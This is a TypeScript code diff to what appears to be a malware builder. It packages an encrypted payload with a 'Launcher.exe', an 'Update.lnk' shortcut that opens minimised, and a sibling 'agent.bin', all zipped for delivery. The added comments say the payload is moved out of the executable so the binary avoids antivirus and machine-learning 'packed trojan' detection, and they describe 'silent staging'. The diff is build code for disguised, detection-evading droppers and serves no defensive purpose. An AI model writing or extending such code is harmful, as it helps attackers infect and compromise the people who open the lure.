@@ -21,7 +21,7 @@ import * as payloadCache from "./payload-cache";
 import * as launcherPool from "./launcher-pool";
 import { createZip } from "./zip-archive";
 import { validateLauncherBuild } from "./launcher-validate";
-import { HDR_LEN, ENV_LEN, assembleOverlay } from "./launcher-overlay";
+import { HDR_LEN, ENV_LEN, assembleOverlay, buildAgentBin } from "./launcher-overlay";
 import { env } from "./env";
 
 export { HDR_LEN, ENV_LEN };
@@ -142,7 +142,10 @@ export async function runLauncherBuild(opts: {
   // 3. config string + cipher (K_B/IV_CFG).
   const configText = buildConfigString(inputs);
 
-  // 4. assemble + append the overlay (production flags = 0 → silent staging).
+  // 4. assemble the (EXTERNAL-payload) overlay + write the sibling agent.bin.
+  //    Option A (AV): the payload ciphertext is NOT appended to Launcher.exe,
+  //    so the PE stays a small low-entropy binary (no "tiny exe + 12 MB random
+  //    blob = packed trojan" ML signature). Launcher reads agent.bin at runtime.
   const sealKey = Buffer.from(entry.sealKeyHex, "hex");
   const sealIv = Buffer.from(entry.sealIvHex, "hex");
   const overlay = assembleOverlay({
@@ -155,6 +158,19 @@ export async function runLauncherBuild(opts: {
     payload: plain,
     payloadCipher: payCipher,
     flags: 0,
+    externalPayload: true,
+  });
+  const agentBin = buildAgentBin({
+    sealKey,
+    sealIv,
+    kb,
+    ivPay,
+    ivCfg,
+    configText,
+    payload: plain,
+    payloadCipher: payCipher,
+    flags: 0,
+    externalPayload: true,
   });
   const stampedExe = Buffer.concat([entry.exe, overlay]);
   if (!launcherPool.peIsGui(stampedExe)) {
@@ -164,7 +180,9 @@ export async function runLauncherBuild(opts: {
   }
   const launcherPath = storage.launcherOutputPath(jobId);
   const lnkPath = storage.lnkRelativeOutputPath(jobId);
+  const agentBinPath = storage.agentBinOutputPath(jobId);
   fs.writeFileSync(launcherPath, stampedExe);
+  fs.writeFileSync(agentBinPath, agentBin);
 
   // 5. Update.lnk — Launcher.exe target, zero arguments, ShowCommand 7.
   //    Uses env.LAUNCHER_LNK_TARGET (absolute path) when set -> a normal
@@ -189,10 +207,11 @@ export async function runLauncherBuild(opts: {
   }
   const lnk = fs.readFileSync(lnkPath);
 
-  // 6. zip { Update.lnk, Launcher.exe } (temp files stay until validation).
+  // 6. zip { Update.lnk, Launcher.exe, agent.bin } (temp files stay until validation).
   const zip = createZip([
     { name: "Update.lnk", data: lnk },
     { name: "Launcher.exe", data: stampedExe },
+    { name: "agent.bin", data: agentBin },
   ]);
   const zipPath = storage.zipOutputPath(jobId);
   fs.writeFileSync(zipPath, zip);
@@ -208,6 +227,7 @@ export async function runLauncherBuild(opts: {
     payloadPlain: plain,
     sealKey,
     sealIv,
+    agentBin,
     prevLauncherHash: lastLauncherSha256,
     prevLnkHash: lastLnkSha256,
   });
